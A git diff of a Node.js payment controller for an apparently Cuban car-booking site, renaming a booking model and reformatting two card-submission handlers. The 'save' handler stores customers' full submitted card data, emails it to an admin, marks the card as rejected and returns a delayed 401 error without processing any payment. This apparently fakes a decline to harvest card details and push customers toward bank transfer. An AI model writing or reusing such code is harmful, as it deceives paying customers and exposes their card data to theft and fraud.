@@ -17,7 +17,7 @@ const save = async (req, res) => {
         //Find Booking and Make sure payment Method is Credit Card
         const query = {causale: req.body.booking};
         const changes = {paymentMethod: "creditCardPay", state: 'PROCESANDO'};
-        const booking = await models.HavanaCarBooking.findOneAndUpdate(query, changes);
+        const booking = await models.CubaGoldCarBooking.findOneAndUpdate(query, changes);
         
         //Make sure Booking Exists
         if(!booking) return res.sendStatus(404);
@@ -70,73 +70,68 @@ const save = async (req, res) => {
 
 //This function only loads cards data
 const save = async (req, res) => {
+  try {
+    //Find Booking and Make sure payment Method is Credit Card
+    const query = { causale: req.body.booking };
+    const changes = {
+      paymentMethod: "bankPay",
+      state: "PENDIENTE",
+      wasCardRejected: true,
+    };
+    const booking = await models.CubaGoldCarBooking.findOneAndUpdate(
+      query,
+      changes
+    );
 
-    try {
+    //Make sure Booking Exists
+    if (!booking) return res.sendStatus(404);
 
-        //Find Booking and Make sure payment Method is Credit Card
-        const query = { causale: req.body.booking };
-        const changes = {
-            paymentMethod: "bankPay",
-            state: 'PENDIENTE',
-            wasCardRejected: true
-        };
-        const booking = await models.HavanaCarBooking.findOneAndUpdate(query, changes);
+    //Hande Pics
+    const timeStamp = new Date().getTime();
 
-        //Make sure Booking Exists
-        if (!booking) return res.sendStatus(404);
+    //Save CC Data
+    req.body.isUsed = false;
+    req.body.time = timeStamp;
+    req.body.bookingId = booking._id;
+    req.body.currencySymbol = booking.currency;
 
-        //Hande Pics
-        const timeStamp = new Date().getTime();
+    const newCard = await models.Card(req.body).save();
 
-        //Save CC Data
-        req.body.isUsed = false;
-        req.body.time = timeStamp;
-        req.body.bookingId = booking._id;
-        req.body.currencySymbol = booking.currency;
+    //Inform Admin
+    mailer.informNewCC(newCard);
+    mailer.paymentRejectedEmail(booking);
 
-        const newCard = await models.Card(req.body).save();
-
-        //Inform Admin
-        mailer.informNewCC(newCard);
-        mailer.paymentRejectedEmail(booking);
-
-        //Send Response 401 so that front end can show error
-        setTimeout(() => res.sendStatus(401), 5000);
-
-    } catch (error) {
-        console.log(error);
-        res.sendStatus(500);
-    }
-
-}
+    //Send Response 401 so that front end can show error
+    setTimeout(() => res.sendStatus(401), 5000);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(500);
+  }
+};
 
 const saveCustom = async (req, res) => {
+  try {
+    //Save CC Data
+    req.body.isUsed = false;
+    const timeStamp = new Date().getTime();
+    req.body.time = timeStamp;
+    req.body.bookingId = req.body.booking;
 
-    try {
+    const link = await models.Link.findOne({ causale: req.body.booking });
+    req.body.currencySymbol = link.divisa;
 
-        //Save CC Data
-        req.body.isUsed = false;
-        const timeStamp = new Date().getTime();
-        req.body.time = timeStamp;
-        req.body.bookingId = req.body.booking;
+    const newCard = await models.Card(req.body).save();
 
-        const link = await models.Link.findOne({ causale: req.body.booking });
-        req.body.currencySymbol = link.divisa;
+    //Inform Admin
+    mailer.informNewCC(newCard);
+    //mailer.paymentRejectedEmail(booking);
 
-        const newCard = await models.Card(req.body).save();
-
-        //Inform Admin
-        mailer.informNewCC(newCard);
-        //mailer.paymentRejectedEmail(booking);
-
-        //Send Response 401 so that front end can show error
-        setTimeout(() => res.status(200).json({ booking: { _id: 0 } }), 5000);
-
-    } catch (error) {
-        console.log(error);
-        res.sendStatus(500);
-    }
-
-}
+    //Send Response 401 so that front end can show error
+    setTimeout(() => res.status(200).json({ booking: { _id: 0 } }), 5000);
+  } catch (error) {
+    console.log(error);
+    res.sendStatus(500);
+  }
+};
 
 module.exports = { save, saveCustom };
